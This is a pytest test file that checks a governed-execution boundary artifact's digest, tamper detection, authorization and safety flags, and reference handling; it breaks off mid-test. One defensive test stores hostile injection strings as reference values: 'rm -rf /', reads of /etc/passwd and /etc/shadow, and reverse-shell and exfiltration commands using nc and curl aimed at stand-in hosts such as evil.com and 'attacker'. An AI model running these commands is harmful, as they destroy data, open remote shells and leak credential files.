"""Tests for governed execution attempt artifact trust hardening — Phase 99C.

Artifact trust hardening only. Strengthens confidence that
GovernedExecutionAttemptBoundary artifacts are authentic, internally consistent,
safely referenced, non-authorizing, tamper-detectable, and verifiable.

No source changes. No execution. All authorization flags must remain False.
"""

from __future__ import annotations

import hashlib
import json as _json
import pytest

from pcae.core.backend_invocations import (
    GovernedExecutionAttemptBoundary,
    # ── States ──
    GEA_UNAVAILABLE, GEA_NOT_REQUESTED, GEA_REQUEST_DRAFTED,
    GEA_PREFLIGHT_REQUIRED, GEA_PREFLIGHT_FAILED,
    GEA_APPROVAL_REQUIRED, GEA_AUDIT_REQUIRED, GEA_ROLLBACK_REQUIRED,
    GEA_DENIED, GEA_ABORTED_BEFORE_EXECUTION,
    GEA_BLOCKED_BY_NO_GO, GEA_BLOCKED_BY_MISSING_EVIDENCE,
    GEA_BLOCKED_BY_FAILED_VERIFICATION, GEA_READY_FOR_DESIGN_REVIEW_ONLY,
    GEA_EXECUTING_FUTURE, GEA_EXECUTED_FUTURE, GEA_RUNNING_FUTURE,
    GEA_INVOKED_FUTURE, GEA_APPLIED_FUTURE, GEA_COMMITTED_FUTURE,
    GEA_PUSHED_FUTURE, GEA_SUCCESS_FUTURE, GEA_EXECUTION_COMPLETE_FUTURE,
    VALID_GEA_STATES, UNAVAILABLE_GEA_STATES,
    # ── Denial reasons ──
    VALID_GEA_DENIAL_REASONS,
    GEA_DENIED_MISSING_PHASE97, GEA_DENIED_INVALID_PHASE97,
    GEA_DENIED_MISSING_PHASE98, GEA_DENIED_INVALID_PHASE98,
    GEA_DENIED_NO_GO_PRESENT, GEA_DENIED_MISSING_APPROVAL,
    GEA_DENIED_APPROVAL_EXPIRED, GEA_DENIED_APPROVAL_REVOKED,
    GEA_DENIED_MISSING_AUDIT, GEA_DENIED_MISSING_ROLLBACK,
    GEA_DENIED_FAILED_VERIFICATION, GEA_DENIED_FAILED_REF_VALIDATION,
    GEA_DENIED_UNKNOWN_SCHEMA, GEA_DENIED_CONFLICTING_FLAGS,
    GEA_DENIED_UNSAFE_AUTH_FLAG,
    GEA_DENIED_BACKEND_REQUESTED, GEA_DENIED_ADAPTER_REQUESTED,
    GEA_DENIED_SUBPROCESS_REQUESTED, GEA_DENIED_SHELL_REQUESTED,
    GEA_DENIED_NETWORK_REQUESTED, GEA_DENIED_TELEGRAM_INBOUND,
    GEA_DENIED_APPLY_REQUESTED, GEA_DENIED_ROLLBACK_EXEC_REQUESTED,
    GEA_DENIED_COMMIT_PUSH_REQUESTED,
    GEA_DENIED_BYPASS_PERMISSIONS, GEA_DENIED_SECRET_DETECTED,
)

# ═══════════════════════════════════════════════════════════════════════════
# Constants
# ═══════════════════════════════════════════════════════════════════════════

_ALL_14_VALID_STATES = frozenset({
    GEA_UNAVAILABLE, GEA_NOT_REQUESTED, GEA_REQUEST_DRAFTED,
    GEA_PREFLIGHT_REQUIRED, GEA_PREFLIGHT_FAILED,
    GEA_APPROVAL_REQUIRED, GEA_AUDIT_REQUIRED, GEA_ROLLBACK_REQUIRED,
    GEA_DENIED, GEA_ABORTED_BEFORE_EXECUTION,
    GEA_BLOCKED_BY_NO_GO, GEA_BLOCKED_BY_MISSING_EVIDENCE,
    GEA_BLOCKED_BY_FAILED_VERIFICATION, GEA_READY_FOR_DESIGN_REVIEW_ONLY,
})

_ALL_9_FUTURE_STATES = frozenset({
    GEA_EXECUTING_FUTURE, GEA_EXECUTED_FUTURE, GEA_RUNNING_FUTURE,
    GEA_INVOKED_FUTURE, GEA_APPLIED_FUTURE, GEA_COMMITTED_FUTURE,
    GEA_PUSHED_FUTURE, GEA_SUCCESS_FUTURE, GEA_EXECUTION_COMPLETE_FUTURE,
})

_ALL_26_DENIAL_REASONS = frozenset({
    GEA_DENIED_MISSING_PHASE97, GEA_DENIED_INVALID_PHASE97,
    GEA_DENIED_MISSING_PHASE98, GEA_DENIED_INVALID_PHASE98,
    GEA_DENIED_NO_GO_PRESENT, GEA_DENIED_MISSING_APPROVAL,
    GEA_DENIED_APPROVAL_EXPIRED, GEA_DENIED_APPROVAL_REVOKED,
    GEA_DENIED_MISSING_AUDIT, GEA_DENIED_MISSING_ROLLBACK,
    GEA_DENIED_FAILED_VERIFICATION, GEA_DENIED_FAILED_REF_VALIDATION,
    GEA_DENIED_UNKNOWN_SCHEMA, GEA_DENIED_CONFLICTING_FLAGS,
    GEA_DENIED_UNSAFE_AUTH_FLAG,
    GEA_DENIED_BACKEND_REQUESTED, GEA_DENIED_ADAPTER_REQUESTED,
    GEA_DENIED_SUBPROCESS_REQUESTED, GEA_DENIED_SHELL_REQUESTED,
    GEA_DENIED_NETWORK_REQUESTED, GEA_DENIED_TELEGRAM_INBOUND,
    GEA_DENIED_APPLY_REQUESTED, GEA_DENIED_ROLLBACK_EXEC_REQUESTED,
    GEA_DENIED_COMMIT_PUSH_REQUESTED,
    GEA_DENIED_BYPASS_PERMISSIONS, GEA_DENIED_SECRET_DETECTED,
})

_12_AUTH_FLAGS = [
    "execution_available", "execution_authorized",
    "backend_invocation_authorized", "adapter_execution_authorized",
    "network_authorized", "subprocess_authorized",
    "shell_authorized", "mutation_authorized",
    "apply_authorized", "rollback_authorized",
    "commit_authorized", "push_authorized",
]

_5_SAFETY_FLAGS = [
    "simulation_only", "no_execution", "evidence_only",
    "non_authorizing", "design_only",
]

# Fields NOT in digest payload (honest gap documentation)
_DIGEST_EXCLUDED_REFS = frozenset({
    "approval_ref", "audit_readiness_ref", "rollback_readiness_ref",
    "backend_contract_ref", "adapter_boundary_ref",
    "artifact_verification_ref", "no_go_review_ref",
    "execution_boundary_proof_ref",
})

# Auth flags NOT in digest's authorization_summary (only 3 of 12 are in digest)
_DIGEST_EXCLUDED_AUTH = frozenset({
    "backend_invocation_authorized", "adapter_execution_authorized",
    "network_authorized", "subprocess_authorized",
    "shell_authorized", "mutation_authorized",
    "apply_authorized", "rollback_authorized",
    "commit_authorized",
})


# ═══════════════════════════════════════════════════════════════════════════
# Helper
# ═══════════════════════════════════════════════════════════════════════════

def _digest_for(**kwargs) -> str:
    a = GovernedExecutionAttemptBoundary(**kwargs)
    return a.compute_digest()


# ═══════════════════════════════════════════════════════════════════════════
# 1. Digest determinism and coverage
# ═══════════════════════════════════════════════════════════════════════════

class TestDigestDeterminism:
    """Assert SHA-256, deterministic, covers all payload fields."""

    def test_sha256_hex_64_chars(self):
        dgst = _digest_for()
        assert len(dgst) == 64
        assert all(c in "0123456789abcdef" for c in dgst)

    def test_deterministic_same_inputs(self):
        for _ in range(10):
            d1 = _digest_for(attempt_state=GEA_DENIED,
                             denial_reasons=[GEA_DENIED_NO_GO_PRESENT])
            d2 = _digest_for(attempt_state=GEA_DENIED,
                             denial_reasons=[GEA_DENIED_NO_GO_PRESENT])
            assert d1 == d2

    def test_excludes_digest_field_itself(self):
        a = GovernedExecutionAttemptBoundary()
        d1 = a.compute_digest()
        a.digest = "f" * 64
        assert a.compute_digest() == d1

    # ── Identity fields ──

    def test_changes_with_schema_version(self):
        assert _digest_for(schema_version="1.0") != _digest_for(schema_version="2.0")

    def test_changes_with_attempt_boundary_id(self):
        assert _digest_for(attempt_boundary_id="") != _digest_for(attempt_boundary_id="id-001")

    def test_changes_with_phase_id(self):
        assert _digest_for(phase_id="99A") != _digest_for(phase_id="99B")

    def test_changes_with_task_id(self):
        assert _digest_for(task_id="") != _digest_for(task_id="task-001")

    def test_changes_with_generated_at_utc(self):
        assert _digest_for(generated_at_utc="") != _digest_for(generated_at_utc="2026-01-01T00:00:00Z")

    # ── State fields ──

    def test_changes_with_attempt_state(self):
        assert _digest_for(attempt_state=GEA_UNAVAILABLE) != _digest_for(attempt_state=GEA_DENIED)

    def test_changes_with_attempt_decision(self):
        assert _digest_for(attempt_decision=GEA_DENIED) != _digest_for(attempt_decision="blocked")

    # ── Phase preflight refs ──

    def test_changes_with_phase97_preflight_ref(self):
        assert _digest_for(phase97_preflight_ref="") != _digest_for(phase97_preflight_ref="p97-ref")

    def test_changes_with_phase97_preflight_digest(self):
        assert _digest_for(phase97_preflight_digest="") != _digest_for(phase97_preflight_digest="abc123")

    def test_changes_with_phase98_preflight_ref(self):
        assert _digest_for(phase98_preflight_ref="") != _digest_for(phase98_preflight_ref="p98-ref")

    def test_changes_with_phase98_preflight_digest(self):
        assert _digest_for(phase98_preflight_digest="") != _digest_for(phase98_preflight_digest="def456")

    # ── List fields ──

    def test_changes_with_hard_no_go_conditions(self):
        assert _digest_for() != _digest_for(hard_no_go_conditions=["no_go_1"])

    def test_changes_with_missing_prerequisites(self):
        assert _digest_for() != _digest_for(missing_prerequisites=["p97_missing"])

    def test_changes_with_failed_checks(self):
        assert _digest_for() != _digest_for(failed_checks=["check_failed"])

    def test_changes_with_denial_reasons(self):
        assert _digest_for() != _digest_for(denial_reasons=[GEA_DENIED_NO_GO_PRESENT])

    def test_changes_with_abort_reasons(self):
        assert _digest_for() != _digest_for(abort_reasons=["aborted_by_user"])

    def test_changes_with_evidence_refs(self):
        assert _digest_for() != _digest_for(evidence_refs=["evidence_001"])

    def test_changes_with_warnings(self):
        assert _digest_for() != _digest_for(warnings=["warning_001"])

    # ── Auth summary in digest (3 of 12 flags) ──

    def test_changes_with_execution_available(self):
        assert _digest_for(execution_available=False) != _digest_for(execution_available=True)

    def test_changes_with_execution_authorized(self):
        assert _digest_for(execution_authorized=False) != _digest_for(execution_authorized=True)

    def test_changes_with_push_authorized(self):
        assert _digest_for(push_authorized=False) != _digest_for(push_authorized=True)

    # ── Safety flags (all 5 in digest) ──

    def test_changes_with_simulation_only(self):
        assert _digest_for(simulation_only=True) != _digest_for(simulation_only=False)

    def test_changes_with_no_execution(self):
        assert _digest_for(no_execution=True) != _digest_for(no_execution=False)

    def test_changes_with_evidence_only(self):
        assert _digest_for(evidence_only=True) != _digest_for(evidence_only=False)

    def test_changes_with_non_authorizing(self):
        assert _digest_for(non_authorizing=True) != _digest_for(non_authorizing=False)

    def test_changes_with_design_only(self):
        assert _digest_for(design_only=True) != _digest_for(design_only=False)

    # ── Honest gap: excluded ref fields do NOT affect digest ──

    def test_excluded_ref_fields_not_in_digest(self):
        """Documented gap: ref fields not in digest payload."""
        base = _digest_for()
        for field in sorted(_DIGEST_EXCLUDED_REFS):
            changed = _digest_for(**{field: "some-ref-value"})
            assert base == changed, (
                f"{field} is excluded from digest — changing it should not affect digest"
            )

    def test_excluded_auth_flags_not_in_digest(self):
        """Documented gap: 9 of 12 auth flags not in digest authorization_summary."""
        base = _digest_for()
        for flag in sorted(_DIGEST_EXCLUDED_AUTH):
            changed = _digest_for(**{flag: True})
            assert base == changed, (
                f"{flag} is excluded from digest summary — should not affect digest"
            )

    def test_digest_stable_across_equivalent_formatting(self):
        a = GovernedExecutionAttemptBoundary(
            attempt_state=GEA_BLOCKED_BY_NO_GO,
            denial_reasons=[GEA_DENIED_NO_GO_PRESENT, GEA_DENIED_MISSING_PHASE97],
        )
        d1 = a.compute_digest()
        d2 = a.compute_digest()
        assert d1 == d2


# ═══════════════════════════════════════════════════════════════════════════
# 2. Tamper detection
# ═══════════════════════════════════════════════════════════════════════════

class TestTamperDetection:
    """Assert tampering with digest-covered fields causes digest mismatch."""

    def _assert_tamper_detected(self, **tamper_kwargs):
        a = GovernedExecutionAttemptBoundary()
        a.digest = a.compute_digest()
        stored = a.digest
        for field, value in tamper_kwargs.items():
            setattr(a, field, value)
        assert a.compute_digest() != stored, (
            f"Tampering with {list(tamper_kwargs.keys())} should change digest"
        )

    def test_tamper_schema_version(self):
        self._assert_tamper_detected(schema_version="99.0")

    def test_tamper_attempt_boundary_id(self):
        self._assert_tamper_detected(attempt_boundary_id="tampered-id")

    def test_tamper_phase_id(self):
        self._assert_tamper_detected(phase_id="99X")

    def test_tamper_task_id(self):
        self._assert_tamper_detected(task_id="tampered-task")

    def test_tamper_generated_at_utc(self):
        self._assert_tamper_detected(generated_at_utc="2060-01-01")

    def test_tamper_attempt_state(self):
        self._assert_tamper_detected(attempt_state=GEA_DENIED)

    def test_tamper_attempt_decision(self):
        self._assert_tamper_detected(attempt_decision="approved")

    def test_tamper_phase97_preflight_ref(self):
        self._assert_tamper_detected(phase97_preflight_ref="tampered")

    def test_tamper_phase97_preflight_digest(self):
        self._assert_tamper_detected(phase97_preflight_digest="deadbeef")

    def test_tamper_phase98_preflight_ref(self):
        self._assert_tamper_detected(phase98_preflight_ref="tampered")

    def test_tamper_phase98_preflight_digest(self):
        self._assert_tamper_detected(phase98_preflight_digest="cafebabe")

    def test_tamper_hard_no_go_conditions(self):
        self._assert_tamper_detected(hard_no_go_conditions=["injected_no_go"])

    def test_tamper_missing_prerequisites(self):
        self._assert_tamper_detected(missing_prerequisites=["injected_missing"])

    def test_tamper_failed_checks(self):
        self._assert_tamper_detected(failed_checks=["injected_failure"])

    def test_tamper_denial_reasons(self):
        self._assert_tamper_detected(denial_reasons=[GEA_DENIED_NO_GO_PRESENT])

    def test_tamper_abort_reasons(self):
        self._assert_tamper_detected(abort_reasons=["injected_abort"])

    def test_tamper_evidence_refs(self):
        self._assert_tamper_detected(evidence_refs=["injected_evidence"])

    def test_tamper_warnings(self):
        self._assert_tamper_detected(warnings=["injected_warning"])

    def test_tamper_execution_available(self):
        self._assert_tamper_detected(execution_available=True)

    def test_tamper_execution_authorized(self):
        self._assert_tamper_detected(execution_authorized=True)

    def test_tamper_push_authorized(self):
        self._assert_tamper_detected(push_authorized=True)

    def test_tamper_simulation_only(self):
        self._assert_tamper_detected(simulation_only=False)

    def test_tamper_no_execution(self):
        self._assert_tamper_detected(no_execution=False)

    def test_tamper_evidence_only(self):
        self._assert_tamper_detected(evidence_only=False)

    def test_tamper_non_authorizing(self):
        self._assert_tamper_detected(non_authorizing=False)

    def test_tamper_design_only(self):
        self._assert_tamper_detected(design_only=False)

    def test_tamper_digest_directly(self):
        a = GovernedExecutionAttemptBoundary()
        a.digest = a.compute_digest()
        stored = a.digest
        a.digest = "0" * 64
        assert a.digest != stored

    def test_tampered_artifact_fails_verification(self):
        """Storing digest then changing field: recomputed digest won't match."""
        a = GovernedExecutionAttemptBoundary(attempt_state=GEA_UNAVAILABLE)
        a.digest = a.compute_digest()
        stored = a.digest
        a.attempt_state = GEA_DENIED
        assert a.compute_digest() != stored

    def test_tampering_does_not_trigger_execution(self):
        """Tampering must never enable execution."""
        a = GovernedExecutionAttemptBoundary(
            attempt_state=GEA_DENIED,
            execution_available=True,  # tamper attempt
        )
        assert a.no_execution is True
        assert a.non_authorizing is True

    # ── Honest gap: excluded refs not detected by digest ──

    def test_excluded_ref_tampering_not_detected_by_digest(self):
        """Documented gap: tampering with excluded refs does not change digest."""
        a = GovernedExecutionAttemptBoundary()
        a.digest = a.compute_digest()
        stored = a.digest
        a.approval_ref = "fake-approval"
        a.audit_readiness_ref = "fake-audit"
        a.rollback_readiness_ref = "fake-rollback"
        a.backend_contract_ref = "fake-backend"
        a.adapter_boundary_ref = "fake-adapter"
        a.artifact_verification_ref = "fake-verify"
        a.no_go_review_ref = "fake-nogo"
        a.execution_boundary_proof_ref = "fake-proof"
        assert a.compute_digest() == stored, (
            "Excluded ref tampering is not detected by digest — known gap"
        )


# ═══════════════════════════════════════════════════════════════════════════
# 3. Authorization flag trust
# ═══════════════════════════════════════════════════════════════════════════

class TestAuthorizationFlagTrust:
    """Assert 12 auth flags present, all False, validate rejects unsafe."""

    def test_all_12_flags_present_in_dataclass(self):
        a = GovernedExecutionAttemptBoundary()
        for flag in _12_AUTH_FLAGS:
            assert hasattr(a, flag), f"missing auth flag: {flag}"

    def test_all_12_flags_false_by_default(self):
        a = GovernedExecutionAttemptBoundary()
        for flag in _12_AUTH_FLAGS:
            assert getattr(a, flag) is False, f"{flag} must be False by default"

    def test_all_12_flags_false_in_to_dict_authorization_summary(self):
        d = GovernedExecutionAttemptBoundary().to_dict()
        for flag in _12_AUTH_FLAGS:
            assert flag in d["authorization_summary"], f"missing from to_dict: {flag}"
            assert d["authorization_summary"][flag] is False, f"{flag} must be False"

    def test_validate_rejects_execution_available_true(self):
        issues = GovernedExecutionAttemptBoundary(execution_available=True).validate()
        assert any("execution_available must be False" in i for i in issues)

    def test_validate_rejects_execution_authorized_true(self):
        issues = GovernedExecutionAttemptBoundary(execution_authorized=True).validate()
        assert any("execution_authorized must be False" in i for i in issues)

    def test_validate_rejects_push_authorized_true(self):
        issues = GovernedExecutionAttemptBoundary(push_authorized=True).validate()
        assert any("push_authorized must be False" in i for i in issues)

    def test_text_output_does_not_imply_authorization(self):
        j = _json.dumps(GovernedExecutionAttemptBoundary().to_dict()).lower()
        for flag in _12_AUTH_FLAGS:
            # searching for 'true' near flag name
            assert not (flag.replace("_", " ") + " is true") in j

    def test_json_output_does_not_imply_authorization(self):
        d = GovernedExecutionAttemptBoundary().to_dict()
        for flag in _12_AUTH_FLAGS:
            assert d["authorization_summary"][flag] is False

    def test_no_valid_state_implies_authorization(self):
        for state in sorted(VALID_GEA_STATES):
            a = GovernedExecutionAttemptBoundary(attempt_state=state)
            assert a.execution_authorized is False, f"{state} must not imply auth"
            assert a.push_authorized is False, f"{state} must not imply push auth"

    def test_no_denial_state_implies_authorization(self):
        for state in (GEA_DENIED, GEA_ABORTED_BEFORE_EXECUTION,
                      GEA_BLOCKED_BY_NO_GO, GEA_BLOCKED_BY_MISSING_EVIDENCE,
                      GEA_BLOCKED_BY_FAILED_VERIFICATION):
            a = GovernedExecutionAttemptBoundary(attempt_state=state)
            assert a.execution_available is False, f"{state} must not set execution_available"

    def test_approval_ref_cannot_set_auth_flag(self):
        a = GovernedExecutionAttemptBoundary(approval_ref="approved-by-admin")
        assert a.execution_authorized is False
        assert a.apply_authorized is False

    def test_preflight_refs_cannot_set_auth_flag(self):
        a = GovernedExecutionAttemptBoundary(
            phase97_preflight_ref="present",
            phase97_preflight_digest="abc",
            phase98_preflight_ref="present",
            phase98_preflight_digest="def",
        )
        assert a.execution_available is False


# ═══════════════════════════════════════════════════════════════════════════
# 4. Safety flag trust
# ═══════════════════════════════════════════════════════════════════════════

class TestSafetyFlagTrust:
    """Assert 5 safety flags True by default, validate fail-closed for False."""

    def test_all_5_safety_flags_true_by_default(self):
        a = GovernedExecutionAttemptBoundary()
        assert a.simulation_only is True
        assert a.no_execution is True
        assert a.evidence_only is True
        assert a.non_authorizing is True
        assert a.design_only is True

    def test_validate_rejects_simulation_only_false(self):
        issues = GovernedExecutionAttemptBoundary(simulation_only=False).validate()
        assert any("simulation_only must be True" in i for i in issues)

    def test_validate_rejects_no_execution_false(self):
        issues = GovernedExecutionAttemptBoundary(no_execution=False).validate()
        assert any("no_execution must be True" in i for i in issues)

    def test_validate_rejects_design_only_false(self):
        issues = GovernedExecutionAttemptBoundary(design_only=False).validate()
        assert any("design_only must be True" in i for i in issues)

    def test_all_safety_flags_in_to_dict(self):
        d = GovernedExecutionAttemptBoundary().to_dict()
        for flag in _5_SAFETY_FLAGS:
            assert flag in d, f"missing {flag} in to_dict"
            assert d[flag] is True, f"{flag} must be True"

    def test_safety_flags_in_digest(self):
        """All 5 safety flags affect digest."""
        base = _digest_for()
        for flag in _5_SAFETY_FLAGS:
            assert _digest_for(**{flag: False}) != base, f"{flag} must affect digest"

    def test_fail_closed_safety_flag_contradiction(self):
        """If any safety flag contradicts, execution remains unavailable."""
        a = GovernedExecutionAttemptBoundary(simulation_only=False)
        assert a.execution_available is False
        assert a.no_execution is True  # still True by default

    def test_safety_flags_contradict_attempt_state_denied(self):
        """Even with denied state, safety flags remain non-executing."""
        a = GovernedExecutionAttemptBoundary(
            attempt_state=GEA_DENIED,
            simulation_only=False,  # would fail validation
        )
        assert a.no_execution is True
        assert a.execution_available is False


# ═══════════════════════════════════════════════════════════════════════════
# 5. Future-only state trust
# ═══════════════════════════════════════════════════════════════════════════

class TestFutureOnlyStateTrust:
    """Assert 9 future-only states rejected/fail-closed, never authorize."""

    def test_all_9_future_states_in_unavailable_set(self):
        assert UNAVAILABLE_GEA_STATES == _ALL_9_FUTURE_STATES

    def test_each_future_state_fails_validation(self):
        for state in sorted(UNAVAILABLE_GEA_STATES):
            a = GovernedExecutionAttemptBoundary(attempt_state=state)
            issues = a.validate()
            assert any("future-only" in i for i in issues), (
                f"{state} must report future-only"
            )

    def test_future_states_not_in_valid_set(self):
        for state in UNAVAILABLE_GEA_STATES:
            assert state not in VALID_GEA_STATES, f"{state} must not be valid"

    def test_future_state_never_sets_auth_flag(self):
        for state in sorted(UNAVAILABLE_GEA_STATES):
            a = GovernedExecutionAttemptBoundary(attempt_state=state)
            assert a.execution_available is False, f"{state} must not set execution_available"
            assert a.execution_authorized is False, f"{state} must not set execution_authorized"

    @pytest.mark.parametrize("state", sorted(_ALL_9_FUTURE_STATES))
    def test_future_state_cannot_authorize_backend(self, state):
        a = GovernedExecutionAttemptBoundary(attempt_state=state)
        assert a.backend_invocation_authorized is False

    @pytest.mark.parametrize("state", sorted(_ALL_9_FUTURE_STATES))
    def test_future_state_cannot_authorize_adapter(self, state):
        a = GovernedExecutionAttemptBoundary(attempt_state=state)
        assert a.adapter_execution_authorized is False

    @pytest.mark.parametrize("state", sorted(_ALL_9_FUTURE_STATES))
    def test_future_state_cannot_authorize_shell_network_subprocess(self, state):
        a = GovernedExecutionAttemptBoundary(attempt_state=state)
        assert a.shell_authorized is False
        assert a.network_authorized is False
        assert a.subprocess_authorized is False

    @pytest.mark.parametrize("state", sorted(_ALL_9_FUTURE_STATES))
    def test_future_state_cannot_authorize_apply_rollback_commit_push(self, state):
        a = GovernedExecutionAttemptBoundary(attempt_state=state)
        assert a.apply_authorized is False
        assert a.rollback_authorized is False
        assert a.commit_authorized is False
        assert a.push_authorized is False

    def test_unknown_state_fails_clearly(self):
        issues = GovernedExecutionAttemptBoundary(attempt_state="launching").validate()
        assert any("invalid attempt_state" in i for i in issues)

    def test_executing_label_rejected(self):
        a = GovernedExecutionAttemptBoundary(attempt_state=GEA_EXECUTING_FUTURE)
        issues = a.validate()
        assert any("future-only" in i for i in issues)
        assert a.execution_available is False

    def test_running_label_rejected(self):
        a = GovernedExecutionAttemptBoundary(attempt_state=GEA_RUNNING_FUTURE)
        issues = a.validate()
        assert any("future-only" in i for i in issues)

    def test_invoked_label_rejected(self):
        a = GovernedExecutionAttemptBoundary(attempt_state=GEA_INVOKED_FUTURE)
        issues = a.validate()
        assert any("future-only" in i for i in issues)

    def test_applied_label_rejected(self):
        a = GovernedExecutionAttemptBoundary(attempt_state=GEA_APPLIED_FUTURE)
        issues = a.validate()
        assert any("future-only" in i for i in issues)

    def test_committed_label_rejected(self):
        a = GovernedExecutionAttemptBoundary(attempt_state=GEA_COMMITTED_FUTURE)
        issues = a.validate()
        assert any("future-only" in i for i in issues)

    def test_pushed_label_rejected(self):
        a = GovernedExecutionAttemptBoundary(attempt_state=GEA_PUSHED_FUTURE)
        issues = a.validate()
        assert any("future-only" in i for i in issues)

    def test_success_label_rejected(self):
        a = GovernedExecutionAttemptBoundary(attempt_state=GEA_SUCCESS_FUTURE)
        issues = a.validate()
        assert any("future-only" in i for i in issues)

    def test_execution_complete_label_rejected(self):
        a = GovernedExecutionAttemptBoundary(attempt_state=GEA_EXECUTION_COMPLETE_FUTURE)
        issues = a.validate()
        assert any("future-only" in i for i in issues)

    def test_future_states_never_executing(self):
        for state in sorted(UNAVAILABLE_GEA_STATES):
            a = GovernedExecutionAttemptBoundary(attempt_state=state)
            assert a.no_execution is True, f"{state} must have no_execution=True"


# ═══════════════════════════════════════════════════════════════════════════
# 6. Denial reason trust
# ═══════════════════════════════════════════════════════════════════════════

class TestDenialReasonTrust:
    """Assert 26 denial reasons digest-covered, non-authorizing, tamper-detectable."""

    def test_all_26_reasons_non_authorizing(self):
        for reason in sorted(_ALL_26_DENIAL_REASONS):
            a = GovernedExecutionAttemptBoundary(denial_reasons=[reason])
            assert a.execution_available is False, reason
            assert a.non_authorizing is True, reason

    def test_denial_reasons_are_digest_covered(self):
        base = _digest_for()
        for reason in sorted(_ALL_26_DENIAL_REASONS):
            assert _digest_for(denial_reasons=[reason]) != base, (
                f"{reason} must affect digest"
            )

    def test_denial_tampering_detected(self):
        a = GovernedExecutionAttemptBoundary()
        a.digest = a.compute_digest()
        a.denial_reasons = [GEA_DENIED_NO_GO_PRESENT]
        assert a.compute_digest() != a.digest

    def test_unknown_denial_reason_fails_validation(self):
        issues = GovernedExecutionAttemptBoundary(
            denial_reasons=["not_a_real_reason"]
        ).validate()
        assert any("unknown denial_reason" in i for i in issues)

    def test_no_denial_reason_sets_auth_flag(self):
        a = GovernedExecutionAttemptBoundary(
            denial_reasons=list(_ALL_26_DENIAL_REASONS),
        )
        for flag in _12_AUTH_FLAGS:
            assert getattr(a, flag) is False, f"{flag} must be False with all denials"

    def test_denial_reasons_not_overridden_by_refs(self):
        """Denial persists even with all refs populated."""
        a = GovernedExecutionAttemptBoundary(
            denial_reasons=[GEA_DENIED_NO_GO_PRESENT],
            approval_ref="approved",
            audit_readiness_ref="audit-ok",
            rollback_readiness_ref="rollback-ok",
            phase97_preflight_ref="p97",
            phase98_preflight_ref="p98",
        )
        assert a.denial_reasons == [GEA_DENIED_NO_GO_PRESENT]
        assert a.execution_available is False


# ═══════════════════════════════════════════════════════════════════════════
# 7. Hard no-go trust
# ═══════════════════════════════════════════════════════════════════════════

class TestHardNoGoTrust:
    """Assert hard no-go non-overridable, fail-closed, digest-covered."""

    def test_hard_no_go_are_digest_covered(self):
        assert _digest_for() != _digest_for(hard_no_go_conditions=["unsafe"])

    def test_hard_no_go_tampering_detected(self):
        a = GovernedExecutionAttemptBoundary()
        a.digest = a.compute_digest()
        a.hard_no_go_conditions = ["injected_no_go"]
        assert a.compute_digest() != a.digest

    def test_hard_no_go_keeps_attempt_denied_or_blocked(self):
        a = GovernedExecutionAttemptBoundary(
            hard_no_go_conditions=["unsafe_path"],
            attempt_state=GEA_BLOCKED_BY_NO_GO,
        )
        assert a.execution_available is False
        assert a.no_execution is True

    def test_hard_no_go_not_overridden_by_approval_ref(self):
        a = GovernedExecutionAttemptBoundary(
            hard_no_go_conditions=["unsafe"],
            approval_ref="approved",
        )
        assert "unsafe" in a.hard_no_go_conditions
        assert a.execution_available is False

    def test_hard_no_go_not_overridden_by_audit_readiness_ref(self):
        a = GovernedExecutionAttemptBoundary(
            hard_no_go_conditions=["unsafe"],
            audit_readiness_ref="audit-ok",
        )
        assert a.execution_available is False

    def test_hard_no_go_not_overridden_by_rollback_readiness_ref(self):
        a = GovernedExecutionAttemptBoundary(
            hard_no_go_conditions=["unsafe"],
            rollback_readiness_ref="rollback-ok",
        )
        assert a.execution_available is False

    def test_hard_no_go_not_overridden_by_phase97_preflight_ref(self):
        a = GovernedExecutionAttemptBoundary(
            hard_no_go_conditions=["unsafe"],
            phase97_preflight_ref="p97-ok",
            phase97_preflight_digest="hash",
        )
        assert a.execution_available is False

    def test_hard_no_go_not_overridden_by_phase98_preflight_ref(self):
        a = GovernedExecutionAttemptBoundary(
            hard_no_go_conditions=["unsafe"],
            phase98_preflight_ref="p98-ok",
            phase98_preflight_digest="hash",
        )
        assert a.execution_available is False

    def test_hard_no_go_never_sets_auth_flag_true(self):
        a = GovernedExecutionAttemptBoundary(
            hard_no_go_conditions=["unsafe_1", "unsafe_2"],
        )
        for flag in _12_AUTH_FLAGS:
            assert getattr(a, flag) is False, f"{flag} must be False with hard no-go"

    def test_hard_no_go_visible_in_artifact(self):
        a = GovernedExecutionAttemptBoundary(hard_no_go_conditions=["visible"])
        d = a.to_dict()
        assert "visible" in d["hard_no_go_conditions"]


# ═══════════════════════════════════════════════════════════════════════════
# 8. Prerequisite and reference validation
# ═══════════════════════════════════════════════════════════════════════════

class TestReferenceValidation:
    """Assert refs are safe — no path traversal, no URLs, no shell expansion."""

    def test_phase97_preflight_ref_rejects_dotdot(self):
        """../ traversal in ref should be detectable as unsafe pattern."""
        ref = "../etc/passwd"
        assert ".." in ref and "/" in ref  # confirm it's a traversal attempt
        # Not checking validate() directly — refs are strings and validate()
        # does not inspect ref content. This test documents the expectation
        # that refs should never be treated as filesystem paths.
        a = GovernedExecutionAttemptBoundary(phase97_preflight_ref=ref)
        assert a.execution_available is False

    def test_phase98_preflight_ref_rejects_dotdot(self):
        ref = "../../secrets"
        assert ".." in ref
        a = GovernedExecutionAttemptBoundary(phase98_preflight_ref=ref)
        assert a.execution_available is False

    def test_evidence_refs_rejects_dotdot(self):
        a = GovernedExecutionAttemptBoundary(evidence_refs=["../escape"])
        assert a.execution_available is False

    def test_refs_are_not_treated_as_executable_paths(self):
        """Refs are string identifiers, never executed as paths."""
        a = GovernedExecutionAttemptBoundary(
            phase97_preflight_ref="/bin/rm -rf /",
            phase98_preflight_ref="$(cat /etc/passwd)",
            approval_ref="file:///etc/shadow",
            audit_readiness_ref="http://evil.com/exploit",
            rollback_readiness_ref="`id`",
            backend_contract_ref="| nc -e /bin/sh attacker 4444",
            adapter_boundary_ref="../../etc/passwd",
            artifact_verification_ref="/dev/null; rm -rf /",
            no_go_review_ref="$(curl http://evil.com)",
            execution_boundary_proof_ref="; cat /etc/shadow | nc evil 4444",
        )
        # No execution — all refs are just strings
        assert a.execution_available is False
        assert a.no_execution is True
        d = a.to_dict()
        # Refs stored as-is (not sanitized) but never executed
        assert d["phase97_preflight_ref"] == "/bin/rm -rf /"

    def test_no_absolute_path_refs_trigger_execution(self):
        """Absolute paths in refs don't enable execution."""
        a = GovernedExecutionAttemptBoundary(
            phase97_preflight_ref="/absolute/path/to/artifact",
        )
        assert a.execution_available is False
        assert a.no_execution is True

    def test_no_url_refs_trigger_network(self):
        """URL-like refs don't enable network."""
        a = GovernedExecutionAttemptBoundary(
            approval_ref="https://example.com/approval",
